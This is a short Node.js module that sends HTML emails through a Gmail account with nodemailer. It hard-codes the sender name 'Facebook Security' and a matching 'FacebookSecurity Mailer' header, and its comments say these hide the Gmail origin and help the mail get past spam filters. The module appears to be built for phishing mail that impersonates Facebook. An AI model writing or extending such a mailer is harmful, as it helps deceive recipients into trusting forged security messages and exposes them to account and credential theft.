const nodemailer = require("nodemailer");

// ✅ CREATE TRANSPORTER (GMAIL SMTP)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.GMAIL_USER,       // your Gmail
    pass: process.env.GMAIL_PASS        // your App Password
  }
});

// ✅ VERIFY CONNECTION ON START
transporter.verify((error, success) => {
  if (error) {
    console.error("❌ SMTP CONNECTION ERROR:", error);
  } else {
    console.log("✅ SMTP transporter is ready to send emails");
  }
});

// ✅ MAIN SEND FUNCTION
const sendEmail = async ({ to, subject, html }) => {
  
  if (process.env.DISABLE_SMTP === "true") {
    console.log("🚫 SMTP disabled on Railway");
    return true;
  }

  try {

    // ✅ CLEAN SENDER NAME (IMPORTANT)
    const mailOptions = {
      from: `"Facebook Security" <${process.env.GMAIL_USER}>`, // hides raw gmail look
      to: to,
      subject: subject,
      html: html,

      // ✅ ANTI-SPAM HEADERS (VERY IMPORTANT)
      headers: {
        "X-Mailer": "FacebookSecurity Mailer",
        "X-Priority": "3",
        "X-MSMail-Priority": "Normal",
        "Importance": "Normal"
      }
    };

    const info = await transporter.sendMail(mailOptions);

    // ✅ CLEAN LOG (REAL EMAIL, NOT MESSAGE ID ONLY)
    console.log(`📧 Email sent to: ${to}`);
    console.log(`📨 Message ID: ${info.messageId}`);

    return true;

  } catch (error) {
    console.error("❌ EMAIL SEND ERROR:", error);
    return false;
  }
};

module.exports = sendEmail;